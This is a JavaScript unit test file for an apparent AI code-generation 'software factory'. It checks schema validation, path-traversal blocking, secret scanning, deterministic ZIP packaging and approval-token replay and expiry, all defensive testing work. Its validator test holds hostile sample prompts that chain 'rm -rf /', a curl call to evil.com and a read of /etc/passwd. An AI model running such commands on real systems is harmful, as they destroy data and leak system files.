'use strict';

/**
 * AI-Dost 2.0 — Phase 4F: Dedicated Software Factory Unit Test Suite
 * 
 * Tests FactoryContext, FactoryValidator, ZipPackager, and SoftwareFactoryOrchestrator core logic.
 */

const test = require('node:test');
const assert = require('node:assert');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');

const {
  FactoryContext,
  FACTORY_CONTEXT_SCHEMA_VERSION,
  deepFreeze
} = require('../agent/capabilities/softwareFactory/FactoryContext');
const {
  FactoryValidator,
  SUPPORTED_FRAMEWORKS
} = require('../agent/capabilities/softwareFactory/FactoryValidator');
const {
  ZipPackager
} = require('../agent/capabilities/softwareFactory/ZipPackager');
const {
  FactoryResult,
  FACTORY_STATUS
} = require('../agent/capabilities/softwareFactory/FactoryResult');
const {
  SoftwareFactoryOrchestrator
} = require('../agent/capabilities/softwareFactory/SoftwareFactoryOrchestrator');

// ─────────────────────────────────────────────────────────────────────────────
// 1. FACTORY CONTEXT UNIT TESTS
// ─────────────────────────────────────────────────────────────────────────────
test('FactoryContext: validates valid schema v1.0.0 and initializes defaults', () => {
  const ctx = new FactoryContext({
    projectSpec: {
      name: 'test-app',
      prompt: 'Build a task tracker'
    }
  });

  assert.strictEqual(ctx.schemaVersion, FACTORY_CONTEXT_SCHEMA_VERSION);
  assert.ok(ctx.executionId);
  assert.ok(ctx.transactionId);
  assert.strictEqual(ctx.projectSpec.name, 'test-app');
  assert.strictEqual(ctx.stages.fullStack.status, 'PENDING');
  assert.strictEqual(ctx.verification.databaseMigration, 'PENDING');
  assert.deepStrictEqual(ctx.manifest.filesGenerated, []);
});

test('FactoryContext: rejects unknown top-level keys with INVALID_CONTEXT_PAYLOAD', () => {
  assert.throws(() => {
    new FactoryContext({
      unknownField: 'malicious',
      projectSpec: { name: 'app' }
    });
  }, (err) => {
    return err.code === 'INVALID_CONTEXT_PAYLOAD' && err.message.includes('unknownField');
  });
});

test('FactoryContext: rejects unsupported schemaVersion', () => {
  assert.throws(() => {
    new FactoryContext({
      schemaVersion: '99.0.0'
    });
  }, (err) => {
    return err.code === 'INVALID_CONTEXT_PAYLOAD' && err.message.includes('99.0.0');
  });
});

test('FactoryContext: rejects unknown projectSpec keys', () => {
  assert.throws(() => {
    new FactoryContext({
      projectSpec: {
        name: 'app',
        arbitraryUncheckedKey: true
      }
    });
  }, (err) => {
    return err.code === 'INVALID_CONTEXT_PAYLOAD' && err.message.includes('arbitraryUncheckedKey');
  });
});

test('FactoryContext: rejects unknown stage status', () => {
  assert.throws(() => {
    new FactoryContext({
      stages: {
        fullStack: { status: 'INVALID_STATUS' }
      }
    });
  }, (err) => {
    return err.code === 'INVALID_CONTEXT_PAYLOAD' && err.message.includes('INVALID_STATUS');
  });
});

test('FactoryContext: rejects invalid verification status', () => {
  assert.throws(() => {
    new FactoryContext({
      verification: {
        httpRoundtrip: 'NOT_A_VALID_STATUS'
      }
    });
  }, (err) => {
    return err.code === 'INVALID_CONTEXT_PAYLOAD' && err.message.includes('NOT_A_VALID_STATUS');
  });
});

test('FactoryContext: rejects executable functions/closures in payload', () => {
  assert.throws(() => {
    new FactoryContext({
      metadata: {
        evilFn: () => console.log('pwned')
      }
    });
  }, (err) => {
    return err.code === 'INVALID_CONTEXT_PAYLOAD' && err.message.includes('Executable functions are forbidden');
  });
});

test('FactoryContext: toImmutableSnapshot returns a deep-frozen object', () => {
  const ctx = new FactoryContext({
    projectSpec: { name: 'immutability-check' }
  });

  const snapshot = ctx.toImmutableSnapshot();
  assert.ok(Object.isFrozen(snapshot));
  assert.ok(Object.isFrozen(snapshot.projectSpec));
  assert.ok(Object.isFrozen(snapshot.stages));

  assert.throws(() => {
    snapshot.projectSpec.name = 'mutated-name';
  }, TypeError);
});

test('FactoryContext: clone creates an independent mutable copy', () => {
  const ctx = new FactoryContext({
    projectSpec: { name: 'orig-app' }
  });

  const clone = ctx.clone();
  clone.projectSpec.name = 'cloned-app';
  assert.strictEqual(ctx.projectSpec.name, 'orig-app');
  assert.strictEqual(clone.projectSpec.name, 'cloned-app');
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. FACTORY VALIDATOR UNIT TESTS
// ─────────────────────────────────────────────────────────────────────────────
test('FactoryValidator: accepts valid prompt and supported specification', () => {
  const res = FactoryValidator.validateInput({
    name: 'valid-task-app',
    prompt: 'Build a task tracker with React, Express, and SQLite'
  });

  assert.strictEqual(res.ok, true);
  assert.strictEqual(res.errors.length, 0);
});

test('FactoryValidator: rejects null, undefined, or empty prompts', () => {
  const r1 = FactoryValidator.validateInput(null);
  assert.strictEqual(r1.ok, false);

  const r2 = FactoryValidator.validateInput('');
  assert.strictEqual(r2.ok, false);

  const r3 = FactoryValidator.validateInput('   ');
  assert.strictEqual(r3.ok, false);
});

test('FactoryValidator: rejects unsupported frameworks', () => {
  const frameworks = ['Django', 'Ruby on Rails', 'Spring Boot', 'Laravel', 'Vue.js'];
  for (const fw of frameworks) {
    const res = FactoryValidator.validateInput(`Build a blog using ${fw} and postgres`);
    assert.strictEqual(res.ok, false, `Expected failure for framework '${fw}'`);
    assert.ok(res.errors[0].toLowerCase().includes('unsupported framework'));
  }
});

test('FactoryValidator: rejects shell metacharacters and chaining in prompt', () => {
  const badPrompts = [
    'Create app; rm -rf /',
    'Create app && curl http://evil.com',
    'Create app | cat /etc/passwd',
    'Create app with npm install remote-package'
  ];

  for (const p of badPrompts) {
    const res = FactoryValidator.validateInput(p);
    assert.strictEqual(res.ok, false);
    assert.ok(res.errors.some(e => e.includes('Unsafe shell') || e.includes('remote package')));
  }
});

test('FactoryValidator: validates workspace paths and blocks directory traversal', () => {
  const root = path.resolve('/test/workspace');

  // Valid subpaths
  const v1 = FactoryValidator.validateWorkspacePath(root, 'server.js');
  assert.strictEqual(v1.ok, true);
  assert.strictEqual(v1.resolvedPath, path.resolve(root, 'server.js'));

  const v2 = FactoryValidator.validateWorkspacePath(root, 'frontend/src/App.jsx');
  assert.strictEqual(v2.ok, true);

  // Path traversal escapes
  const b1 = FactoryValidator.validateWorkspacePath(root, '../outside.js');
  assert.strictEqual(b1.ok, false);
  assert.strictEqual(b1.code, 'WORKSPACE_TRAVERSAL_DETECTED');

  const b2 = FactoryValidator.validateWorkspacePath(root, '../../etc/passwd');
  assert.strictEqual(b2.ok, false);
  assert.strictEqual(b2.code, 'WORKSPACE_TRAVERSAL_DETECTED');
});

test('FactoryValidator: scans for high-entropy secrets and API keys', () => {
  const clean = FactoryValidator.scanForSecretsAndPaths('const a = 123;');
  assert.strictEqual(clean.clean, true);

  // AWS key
  const aws = FactoryValidator.scanForSecretsAndPaths('const key = "AKIAIOSFODNN7EXAMPLE";');
  assert.strictEqual(aws.clean, false);
  assert.strictEqual(aws.detected[0].name, 'AWS Access Key');

  // Private key
  const rsa = FactoryValidator.scanForSecretsAndPaths('-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----');
  assert.strictEqual(rsa.clean, false);
  assert.strictEqual(rsa.detected[0].name, 'RSA/EC Private Key');

  // GitHub token
  const ght = FactoryValidator.scanForSecretsAndPaths('const token = "ghp_1234567890abcdefghijklmnopqrstuvwxyzAB";');
  assert.strictEqual(ght.clean, false);
  assert.strictEqual(ght.detected[0].name, 'GitHub Personal Token');
});

test('FactoryValidator: scans for production DB credentials and absolute user paths', () => {
  // Production DB URL with remote host
  const prodDb = FactoryValidator.scanForSecretsAndPaths('const url = "postgres://admin:superSecret@db.production.aws.com:5432/main";');
  assert.strictEqual(prodDb.clean, false);
  assert.strictEqual(prodDb.detected[0].name, 'Production Database URL');

  // Localhost DB URL is exempted
  const localDb = FactoryValidator.scanForSecretsAndPaths('const url = "postgres://testuser:testpassword@localhost:5432/testdb";');
  assert.strictEqual(localDb.clean, true);

  // Absolute user home directory leak
  const winUser = FactoryValidator.scanForSecretsAndPaths('const dir = "C:\\\\Users\\\\vikash kumar\\\\secret";');
  assert.strictEqual(winUser.clean, false);
  assert.strictEqual(winUser.detected[0].name, 'Absolute Machine User Path');
});

test('FactoryValidator: detects conflicting pre-existing files', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sf_conflicts_'));
  try {
    fs.writeFileSync(path.join(tmpDir, 'server.js'), 'console.log("old");', 'utf-8');

    const proposed = new Map([
      ['server.js', 'console.log("new");'],
      ['package.json', '{"name":"app"}']
    ]);

    const res = FactoryValidator.detectExistingFileConflicts(tmpDir, proposed);
    assert.strictEqual(res.hasConflict, true);
    assert.strictEqual(res.conflicts.length, 1);
    assert.strictEqual(res.conflicts[0].path, 'server.js');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. DETERMINISTIC ZIP PACKAGER UNIT TESTS
// ─────────────────────────────────────────────────────────────────────────────
test('ZipPackager: rejects path traversal attempts in entries', () => {
  assert.throws(() => {
    ZipPackager.normalizeEntryPath('../escape.txt');
  }, (err) => err.code === 'ZIP_TRAVERSAL_REJECTED');

  assert.throws(() => {
    ZipPackager.normalizeEntryPath('C:\\Windows\\system32');
  }, (err) => err.code === 'ZIP_TRAVERSAL_REJECTED');
});

test('ZipPackager: produces byte-for-byte deterministic ZIP from identical files', () => {
  const files1 = new Map([
    ['b.txt', 'World'],
    ['a.txt', 'Hello'],
    ['sub/c.txt', 'Nested']
  ]);

  const files2 = new Map([
    ['sub/c.txt', 'Nested'],
    ['a.txt', 'Hello'],
    ['b.txt', 'World']
  ]);

  const zip1 = ZipPackager.createZip(files1);
  const zip2 = ZipPackager.createZip(files2);

  assert.strictEqual(zip1.zipSha256, zip2.zipSha256);
  assert.strictEqual(zip1.zipBuffer.length, zip2.zipBuffer.length);
  assert.deepStrictEqual(zip1.entries, ['a.txt', 'b.txt', 'sub/c.txt']);
});

test('ZipPackager: inspectZip reads central directory and verifies manifest', () => {
  const files = new Map([
    ['package.json', '{"name":"test"}'],
    ['src/index.js', 'console.log(1);']
  ]);

  const zip = ZipPackager.createZip(files);
  const inspection = ZipPackager.inspectZip(zip.zipBuffer, ['package.json', 'src/index.js']);

  assert.strictEqual(inspection.ok, true);
  assert.strictEqual(inspection.entryCount, 2);
  assert.strictEqual(inspection.manifestMatches, true);
  assert.deepStrictEqual(inspection.missing, []);
});

test('ZipPackager: inspectZip detects missing files against manifest', () => {
  const files = new Map([['file1.txt', 'content1']]);
  const zip = ZipPackager.createZip(files);
  const inspection = ZipPackager.inspectZip(zip.zipBuffer, ['file1.txt', 'file2.txt']);

  assert.strictEqual(inspection.ok, true);
  assert.strictEqual(inspection.manifestMatches, false);
  assert.deepStrictEqual(inspection.missing, ['file2.txt']);
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. SOFTWARE FACTORY ORCHESTRATOR APPROVAL & LIFECYCLE TESTS
// ─────────────────────────────────────────────────────────────────────────────
test('SoftwareFactoryOrchestrator: approval token lifecycle with scoping, TTL, and replay rejection', () => {
  const orchestrator = new SoftwareFactoryOrchestrator();
  const meta = {
    executionId: 'exec_test_123',
    workspaceRoot: '/workspace/test',
    transactionId: 'tx_123',
    requiredCapabilities: ['coding.full_stack_delivery'],
    actionDigest: 'abc123digest'
  };

  // 1. Issue token
  const issueRes = orchestrator._verifyOrIssueApprovalToken(null, meta);
  assert.strictEqual(issueRes.valid, false);
  assert.strictEqual(issueRes.code, 'APPROVAL_REQUIRED');
  assert.ok(issueRes.issuedToken);

  const token = issueRes.issuedToken;

  // 2. Verify and consume token
  const verifyRes = orchestrator._verifyOrIssueApprovalToken(token, meta);
  assert.strictEqual(verifyRes.valid, true);

  // 3. Replay rejection
  const replayRes = orchestrator._verifyOrIssueApprovalToken(token, meta);
  assert.strictEqual(replayRes.valid, false);
  assert.strictEqual(replayRes.code, 'APPROVAL_REPLAYED');

  // 4. Expiration check
  const expiredMeta = { ...meta, executionId: 'exec_exp' };
  const expIssue = orchestrator._verifyOrIssueApprovalToken(null, expiredMeta);
  const expToken = expIssue.issuedToken;
  // Manually expire token
  orchestrator._factoryApprovalTokens.get(expToken).expiresAt = Date.now() - 1000;
  const expRes = orchestrator._verifyOrIssueApprovalToken(expToken, expiredMeta);
  assert.strictEqual(expRes.valid, false);
  assert.strictEqual(expRes.code, 'APPROVAL_EXPIRED');

  // 5. Action digest mismatch check
  const issue2 = orchestrator._verifyOrIssueApprovalToken(null, meta);
  const mismatchRes = orchestrator._verifyOrIssueApprovalToken(issue2.issuedToken, {
    ...meta,
    actionDigest: 'tampered_digest'
  });
  assert.strictEqual(mismatchRes.valid, false);
  assert.strictEqual(mismatchRes.code, 'APPROVAL_MISMATCH');
});

test('SoftwareFactoryOrchestrator: synthesizes valid files with 4A, 4B, 4D, 4C, 4E components', () => {
  const orchestrator = new SoftwareFactoryOrchestrator();

  const f4A = orchestrator._synthesizeFullStack('test-app', 'Test prompt');
  assert.ok(f4A['package.json']);
  assert.ok(f4A['server.js']);
  assert.ok(f4A['frontend/src/App.jsx']);

  const f4B = orchestrator._synthesizeDatabase();
  assert.ok(f4B['schema.sql'].includes('CREATE TABLE IF NOT EXISTS tasks'));
  assert.ok(f4B['db.js']);

  const f4D = orchestrator._synthesizeApiContractAndClient('test-app');
  assert.ok(f4D['openapi.json'].includes('3.0.3'));
  assert.ok(f4D['apiClient.js'].includes('class ApiClient'));
  assert.ok(f4D['contractValidator.js']);

  const f4C = orchestrator._synthesizeAutomatedTests();
  assert.ok(f4C['tests/api.test.js'].includes("require('node:test')"));

  const f4E = orchestrator._synthesizeCiCdWorkflow('test-app');
  assert.ok(f4E['.github/workflows/ci.yml'].includes('contents: read'));
  assert.ok(f4E['.github/workflows/deploy.yml.template'].includes('workflow_dispatch'));
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. FACTORY RESULT & SPEC OBJECT UNIT TESTS
// ─────────────────────────────────────────────────────────────────────────────
test('FactoryResult: enforces immutable envelope with frozen manifest and verification', () => {
  const res = FactoryResult.success({
    executionId: 'exec_res_1',
    transactionId: 'tx_res_1',
    filesGenerated: ['server.js', 'db.js'],
    checksums: { 'server.js': 'hash1', 'db.js': 'hash2' }
  });

  assert.strictEqual(res.success, true);
  assert.strictEqual(res.status, FACTORY_STATUS.IMPLEMENTED_NOT_FULLY_VERIFIED);
  assert.ok(Object.isFrozen(res));
  assert.ok(Object.isFrozen(res.manifest));
  assert.ok(Object.isFrozen(res.manifest.filesGenerated));
  assert.ok(Object.isFrozen(res.manifest.checksums));
  assert.ok(Object.isFrozen(res.verification));

  assert.throws(() => {
    res.manifest.filesGenerated.push('hack.js');
  }, TypeError);
});

test('FactoryResult: factory failure and conflict envelopes retain errors and diffs', () => {
  const fail = FactoryResult.failure('Synthesis error', {
    executionId: 'exec_fail_1',
    errors: ['Secondary error']
  });
  assert.strictEqual(fail.success, false);
  assert.strictEqual(fail.status, FACTORY_STATUS.FAILED_ROLLED_BACK);
  assert.strictEqual(fail.errors[0], 'Synthesis error');

  const conflict = FactoryResult.conflict(
    [{ path: 'server.js', reason: 'Differing content' }],
    { diffs: ['--- a/server.js\n+++ b/server.js'] }
  );
  assert.strictEqual(conflict.success, false);
  assert.strictEqual(conflict.status, FACTORY_STATUS.CONFLICT_DETECTED);
  assert.strictEqual(conflict.diffs.length, 1);
});

test('FactoryValidator: validates object specs with unsupported subfields', () => {
  const r1 = FactoryValidator.validateInput({
    prompt: 'Build app',
    frontendFramework: 'angular'
  });
  assert.strictEqual(r1.ok, false);
  assert.ok(r1.errors[0].includes('Unsupported frontendFramework'));

  const r2 = FactoryValidator.validateInput({
    prompt: 'Build app',
    backendFramework: 'django'
  });
  assert.strictEqual(r2.ok, false);
  assert.ok(r2.errors[0].includes('Unsupported backendFramework'));

  const r3 = FactoryValidator.validateInput({
    prompt: 'Build app',
    databaseType: 'oracle'
  });
  assert.strictEqual(r3.ok, false);
  assert.ok(r3.errors[0].includes('Unsupported databaseType'));
});

